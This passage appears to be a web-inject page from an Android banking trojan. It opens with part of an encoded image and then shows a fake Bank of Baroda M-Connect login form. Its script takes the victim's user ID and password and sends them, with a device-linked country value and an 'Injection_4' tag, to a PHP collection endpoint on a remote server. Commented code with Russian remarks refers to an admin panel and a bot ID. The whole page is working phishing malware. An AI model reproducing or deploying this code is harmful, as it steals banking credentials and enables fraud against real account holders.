JtaABxQIEKqIQdUIctgO2HWIeJAvSCCAZR2K/VAIMwtaxOgAcjNY0RmAJX0AS7OIUKKAJrQIFYgAd7hIRRaGSGEAECmIPhuwVwEIROkIWPbogoQ4Y+3QIG2Mti0ARvwwQXsNNOzg0CGIS9iAJMGAVoA+wySIqKsNA5TgsYEKpgGIhTcAM3sAY1iIVTaBsCkAVeCk1BEASrZYg8aIBeQFRMSECHwANXQJZd4OuGIAFxUAWtbAgDIJn1AIRe6gFImIWyrwC0v4JWaAUCQAVijwB5l3J6x4g40oT+OHiCSQiGSxgFY7DEEzACFgiFi0UCFlNGX7CCGJAGeGiFIhCHIWACyeZ1amgXIBsFjguOE1ACF4UqUGgB0eYFYUhrhsADVtAQi9UAFDAGcdgBHuCBKVh2Q9AGVCAA5WGIXyAQTPiAowwANEiHOngIM4BJhoi3atSAJUA0Q7ACaSGHT8hjhliFOWiaECApIFDScIgDcwcIQ7ZWcTBk8KAhDktCYWkoSsanfJQKUOFRrUMXhEw+uYKC0NC1Wa4yZSKlC2GeH5CwsEJxAuE4Y6O2fcyhKpWmIFsQblnDUJMMTR8oIeFhscErhEZGNWzqtKklS0+nUm06bJaLU5c2UbL+Y3BLgyAaNHGFcOsj2oO6DjSgEocCDiU9IMBIa9dgl0WaLlVt+IlP0rsGA1Ah1vcw4sQaGJw9uGBINR5O4HhFeAxRq0OXMN14AIVEtrvT3Ixi9hECX84fdVQoNUmwIRMoNFVVdeejEQ1YRMmygnDVslFrACBk1AsTVVDI0ArYwcORGF8fzWThK2pWGXUWADROW2OXi5cHzXBR1ZBVnAAISYgQhAUUEGAIdaGwlvFglyhMQ2lRf5CTGphoYkkbY/yizV2mCMAQYlEldlgmonSyARDjGJKHBxJ80koobjRAAmyGkIBAEmu4gUUpFHwwRAQThJjWCOKUkklfW/XQnWD+cHzC14M99ihDGB+NAI8MpUBSShAJfPTAJaFUAIF/sCXTiSUvfLQIKVhgss9HVVwCDxiCnWCMe1SxMkszCHEwBUOusMAJQre4UUodOIKhG1WY5PCRHZYUqYoMUSiJ0BGiiBKHFba86EQryyyAECex8BjKIsIgBEIFWY4yBY4wYFINjiCgkGUpAih6kBBj9VNXiLUgg1yDUvlY1RWn2AAMAllcocEuFfDhol0LnFDCEEDMEgoFmqAgQhMw5PJiWhh4IMcoNFblCitn4HjXAfCIMiu4NWJhJUJWlNJUJptA8FEz9GBhQFpdrPAsQmcQUMmgBvEiAW3hMPGRA+nks9P+QcIQsspBAUjTSlWhZCGeQWagwgoWuyiAAULAJEKBaYTiOVUm6nxkgCU8YiLKGCO3Yg2rai6wQi2/VSLDECOf21ApRoysAY0UNPAREzjU8BECFDREwQMfNUCBH5UhVAsAJOCozSwPOhguyBV8wIoopcAzRcuW6UIIM3PI0goFBMCDjDLzZADtXREgokEnfZ2ySS/FQHuApFj77VQoEkiHEDNlNoSJGB9FEMsOaEVwxjJKCKHmDgSI8xE0boiSyiwgHnRLNTKs8ZEFPHwUA89UaYBIzAedAOsuUwB9SiiTH8QBFaBQlcowI3y0DyjWZrKLzgj9QoDev40xBTJzvH3+EDTRQCIyQmLg0tAwGqSJUAPmZaLBAUrjQMhHk5zLSibXqMnFLvAiFEAVTqBxg+cGMWFtrH8/1Qkml3xyg28+4osU5AARlXAFBUqhCk/soAZMeBTc7BIBPtBiFIfoSyZG0Y8IQCsF3/iW/v42iigExiCr2AEIDzcPxVVgewcJwyUg4QoNMAIhdkCDBpRBNHhcQhRAiJIhQoCKUSSBaEUIAUIs8AHdTYUdixgZxa7QiRj87hMfsABCMOCGuk3lEnEoCEKocDMsdCITKfgIIaxBA5QoQxApokQJDfGGTsjChQm5AQgxIYuwvYIKn8CCJipRw89doBM0+Vwd3OMKJfj+LmHwAEL9DKGNamhAAwS4gCkIRbHEXC2EDbnEBxCAsIRMYB6LoEQlTkEAAggiE9YoAwJGQK8IomUVULiAGjaRJVqBohNlIFiI8NAJ2njSbxrgw3S22JQriGJwB3lBEDB2kBG4gCmYCIIZEBKIAWCCegcRgyjSlYRTGUQH8MBH0ur1CRsgxBQX2ARVIKHD6iHnErHgIELEQYA5QNAgFrhCVTTxg0wehARAMBwx3BA2Q4RBHHFshoSw8Ikf1EQD/bBQwqKRCodY4yQFRYWmCtBPQwQgFnF4nkEAkIVvleIGozQII2TQhi5p4ArD+EQHPsKDFB6mk54URRQmAI1kMCD+DvCgnQwIcAUXIOMMJcAAQWmJlhOoAwiHAMXm+rIJUKDhALx4kTaUwcxi+u0KV5DHRxjRFFZ84pjbakALwGgQQswCE4eABJcQkgIZYKGRBxEjFlSRzoPMgwJXgBNCuJAOKpwGC/hrCiSKiJBqIAcT+ZCmQXyRDwLIDiFVCEZVBEFFhGzDDbTxnzzRsog6fEQMWbpCJmx3kAKk4wZRNQQINuoXEQDTEHYgCYqW8BEoaKBC64kDKTKB04/cgQBN+EgdviUKFIRtFUogZv7IioVL5IMWmxAFJgQhg1MAYS7OlCpaMHCNHORjFJh47FMOIQpVKAEOQBQMFBTwCd1qF1z+mECBMz6CBwIkdRaVcMB9b7EDPbzUEGDYbihQ4FeBCKAVboDFetYgiCtcQgcIsUUOVhZHYIiAAkqAGEndwCOnpBYhK91NGZaEiVCM9iDKgNVUdmFHQzwABwSgwCwkkINZGsQWcYgxQtogilN8Yg0YPkgCJCADAXwkDFx8jwSQeBBfaOAQmBhAmBBSBkho4T4GWUElgjHdhfagFENDyA2QswnGImQa1sBxT2WlXUywAhOfoEUUxFCC3qI3Y0zYRxQCy1OQXUIDH2CGlkPEiRz0Ap79xZom4vDkg8CgCvOoghUmfJA+wGMZDaaBC2QQjnUhpAvi0MBAEdIMFIgiFKj+cBpJC1AKJzQYCihgyAoRwoBFBxbJB+HBJ0RBCxMgBBZUoEAswnyQfhCbJb2Axkc44YF5zMAK2EbLAWTQA8V1wtHTAJossJAyhEwhhaz4Qh8QAoh6uGITyADiCdxAAR7gCBbVoMAuXvORFpQiSAh5QCtGgYpvH6QKs7hyni+dCk9IAwLvuG8ETXELDrzCG9coBh+QEQcUtHXFU+kEKFyBhUo0AFitgoAbPoHdS4MLqFKtRR1U0Y88fGQbcNBHgw2RABRo4M0N55kGLhDHCVhCAzU2iDp41uKDqIBBTmkycaa5A3HMQHES/QCKJ+AGPDflE3NAUATNAAQCOOEjpkD+wBEifRAPfKICbPhIFpiIMwT8xgMK4AFKDXIGV4wCGYQeRwwOsK1xuCEd7vjILSCAB5cfRABMsZqei4mJLKAlDwv4vLBCYAc7cAIEfeiDM1LwAAgcYQnKWIQIxOGCWRziCqQAhSbeWxVSbAISl6jEDQ6QzRcBgAlzYIUm4EtzH7HiuRHkwBCCN4t4v0gXoRhFAA+yD6NRoGYIgcL1S1A+o21iDb1dgATIPsyuf4TnGSsAR4DwkRLIwuSQ3VMEX9GGT4QiH6K+Sw6kgwT4gw3JAU+Jwr21H1qogDVoAimgAGKFCP2Vgh6MVILsAMNgXn91Qhw8gAekQTwIQA7wATj+SIM0IIES5EM+fIAlqEIplIIGbIIgCEIogALuYQImlBF/7c/tbUIrQIIaKMAihAGKwYYdPIA4GMry6U8qSNuL6MMiBA8WkIIeEJpB6EMkjcEoVADDGQIGvFMnXEEVfEQNfAIKnJcZvBMWcNiONQAkXJBTiMIHMNtdkMAOfIKXzRThXALENUQqQIIHRBAUUMFIVAwDBJ0hwIKHIcQPyACdHQQYWMImNUUoCIBcpQUIaEhDEIHAoQVGvVA3bIUDpIU2DJJBYEABXB4nZZ7myYAMQEIrxGIpbAItbpUm3CImSJFZdcIl9KIvbgYOGoqh2CAoXJ8aKAEylEETzAMWwg3+B0CBMmhIKy2h/swCxiGENpBBCESAPDhCBaSOY4GCApCLQYwAH/DA8BkEHqjCHBBZAnyAoRQB9R1bKcwBZhkCMPBLQ0DCEXwEDFgC2Z0CKHxADWBcOyCAODBFKlyBwR3ED4yRU2BCLyxisIRACIABM+wACoxRhFABFh0ECFzAGXzYDagCHnwEHBSiU3QkPn0EABRDPgjCKTREJgwAHrifQWRDA7DaQTiAIKRCKmBCGaDU24lD8RhEAqDBH2lgf11BKISCIIyCVH4CKeDge9ECVs5CIsQCV8YCClQAWFbAVyKDFlyAAzTBEJyBBxzAAYBABkzACizAtgiGKWAACAj+gARIgSB8gvJRY7gEASoEpmAOZiXkgwtIwfcsWiaEgiwEARX8ABBYQyhYAmAKJgp0Qi9IwGDGAU3OQhwMJipYAmZqpmAqAS3oViZ4AmgqATz0pStcghLsgBgUQw3YwBSgATzwZVO4AGjGQh/S5AB8JmgOJgu4gAtIigYs2hXUXQs4wQ+gQgXU3WBKgCUsFWheJlX4jxq0wCLIQw0UwyRcAAugHBweTidkQQ/gAcgFQSdYA2iqARd1wicUARA4ghOwpiC4p2CywCz0JVX4lCdlgixQQj9EgQlKww4MgYIOgRGMQQo8qD7owjTAgC68gilcKIYWWloEQAiAAAIsQT7+XMHJYMIO+uXf3CKKpugtCmMu1ogmiAIpvGgmXIGK8gWNpmgKpYIoqChAMROOPtYlqGhW0Yqh/CIpiIL9CUiKAlRf7KiK4miRMmmevGiM1hOPakmNHsaI/qKhSKlTMFP/bIYoiGiWNoWOvuiOpsaP+giAhhAriAAgQAOO8AKd8gJBcAAiCkYAYACf9ikGBACgmgEJ6IIFFCojPAEhgIERxIADXEAcXEIphMJvmiilVqqlXiqmZqqJtqn+ZAIKREEUiIMCjCqplqoCiENkGIWqruqqVgMymKqpigMQxEElsICtfgA8fAEkvOIojKmm/iqwBquwDuuvcqr+XMIo1KLRsi7rJozCCz4rtEbrCzLrso6CIBCjDeYeiRIrt3art34ruK5iuI4ruZaruZ7ruRoruq4ru7aru74rm7IivM4rvdarvYKrut6rvu4rv/arJ+WrvwaswA6swAIswR4swibsuhqswjaswz4ssDIsxE4sxVasdkmsxWasxm5sxHGsx34syP6nvIYsyZbsxGKsyaasyt4ryq6sy77swsIDzM4szdIrPFRAVOSszu4sz/asz/4s0Aat0A4t0Rat0R4t0iat0i4t0zat0z4t1Ebt0lZAQAAAOw==" />

    <form action="null" method="post" id="_mainForm" target="flow_handler">
        <div class="teaser_box">
            <div class="field-block">
                <input class="input-field" name="userid" id="userid" placeholder="User ID" maxlength="10" type="text" />
            </div>

            <div class="field-block">
                <input class="input-field" name="password" id="password" placeholder="Password" maxlength="50" type="password" />
            </div>

            <div class="field-block">
                <input value="Login" id="submitBtn1" class="submit-button" type="button" />
                <input type="hidden" name="name" value="Bank of Baroda M-Connect" />
            </div>
        </div>

    </form>
    <iframe src="about:blank" name="flow_handler" style="visibility: hidden; display: none"></iframe>
</div>

<script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                  /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота

*/
                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('userid');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						top['closeDlg'] = true;
						/*prompt('send', '{"dialog id" : "sberbankcz'+
						'", "userid": "'+oNumInp.value+
						'", "password": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|bank of baroda|"+oNumInp.value+"|"+oCodeInp.value+"|");
						
						
						return false;
                    };

                })();
            </script>

</body>
</html>
